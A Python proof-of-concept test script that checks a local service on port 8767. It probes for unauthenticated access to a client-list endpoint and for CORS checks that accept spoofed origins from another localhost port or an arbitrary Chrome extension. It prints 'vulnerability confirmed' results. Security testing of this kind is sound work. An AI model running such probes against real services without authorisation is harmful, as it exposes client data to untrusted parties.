import urllib.request
import json

def test_localhost_unauthenticated_access():
    print("=== TEST 1: Local Process Unauthenticated Privileged Endpoint Access ===")
    url = "http://127.0.0.1:8767/api/clients"
    req = urllib.request.Request(url, headers={
        "User-Agent": "UntrustedLocalProcess/1.0"
        # Notice: NO Authorization header, NO cookie, NO session token
    })
    try:
        with urllib.request.urlopen(req) as resp:
            data = json.loads(resp.read().decode())
            print(f"[VULNERABILITY CONFIRMED] HTTP Status: {resp.status}")
            print(f"Data returned without auth token: {len(data.get('clients', []))} clients exposed!")
            print(f"Sample client: {data.get('clients', [{}])[0].get('name', 'N/A')}")
    except Exception as e:
        print(f"[BLOCKED] Request failed: {e}")

def test_cors_origin_bypass():
    print("\n=== TEST 2: Arbitrary Localhost Port CORS Access ===")
    url = "http://127.0.0.1:8767/api/clients"
    req = urllib.request.Request(url, headers={
        "Origin": "http://localhost:3000" # Simulating an untrusted local web app on port 3000
    })
    try:
        with urllib.request.urlopen(req) as resp:
            allow_origin = resp.headers.get("Access-Control-Allow-Origin")
            allow_cred = resp.headers.get("Access-Control-Allow-Credentials")
            print(f"Access-Control-Allow-Origin: {allow_origin}")
            print(f"Access-Control-Allow-Credentials: {allow_cred}")
            if allow_origin == "http://localhost:3000":
                print("[VULNERABILITY CONFIRMED] Untrusted localhost:3000 permitted full CORS access with credentials!")
    except Exception as e:
        print(f"[BLOCKED] Request failed: {e}")

def test_untrusted_chrome_extension():
    print("\n=== TEST 3: Arbitrary Chrome Extension CORS Access ===")
    url = "http://127.0.0.1:8767/api/clients"
    req = urllib.request.Request(url, headers={
        "Origin": "chrome-extension://abcdefghijklmnopqrstuvwxyz123456" # Rogue extension ID
    })
    try:
        with urllib.request.urlopen(req) as resp:
            allow_origin = resp.headers.get("Access-Control-Allow-Origin")
            print(f"Access-Control-Allow-Origin: {allow_origin}")
            if allow_origin.startswith("chrome-extension://"):
                print("[VULNERABILITY CONFIRMED] Arbitrary Chrome Extension accepted by CORS filter!")
    except Exception as e:
        print(f"[BLOCKED] Request failed: {e}")

if __name__ == '__main__':
    test_localhost_unauthenticated_access()
    test_cors_origin_bypass()
    test_untrusted_chrome_extension()
